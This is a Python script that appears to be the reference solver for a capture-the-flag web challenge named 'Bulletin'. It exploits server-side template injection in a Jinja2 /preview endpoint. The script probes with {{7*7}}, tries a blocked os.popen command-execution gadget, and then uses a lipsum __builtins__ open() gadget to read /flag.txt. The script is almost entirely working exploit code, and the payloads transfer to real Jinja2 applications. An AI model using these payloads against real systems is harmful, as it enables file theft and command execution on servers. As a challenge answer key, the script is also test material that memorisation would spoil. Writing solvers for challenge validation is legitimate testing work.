#!/usr/bin/env python3
"""
Reference solver for Bulletin.

Intended solve path: discover the `/preview` endpoint, confirm SSTI with
`{{7*7}}`, determine that command execution is blocked, then use a Jinja2
file-read gadget to retrieve the flag.
"""
import re
import sys
import requests

FLAG_RE = re.compile(r"destrier\{[0-9a-f]{16}\}")

# reads /flag.txt through Jinja2's builtins. This avoids the blocked
# command-execution gadgets (popen, system, subprocess, __import__).
READ_PAYLOAD = "{{ lipsum.__globals__.__builtins__.open('/flag.txt').read() }}"


def solve(base_url: str):
    base_url = base_url.rstrip("/")

    # 1. discover the application
    requests.get(f"{base_url}/", timeout=5)

    # 2. confirm that the template input is evaluated
    r = requests.post(f"{base_url}/preview", data={"template": "{{7*7}}"}, timeout=10)
    assert "49" in r.text, "SSTI not confirmed"

    # 3. show that a straightforward command-execution payload is blocked
    blocked = requests.post(
        f"{base_url}/preview",
        data={"template": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"},
        timeout=10,
    )
    assert blocked.status_code == 400, "expected command-exec payload to be blocked"

    # 4. read the flag directly through the template engine instead
    r = requests.post(f"{base_url}/preview", data={"template": READ_PAYLOAD}, timeout=10)
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: solve.py <base_url>", file=sys.stderr)
        sys.exit(2)
    flag = solve(sys.argv[1])
    if not flag:
        print("FAILED: no flag recovered", file=sys.stderr)
        sys.exit(1)
    print(flag)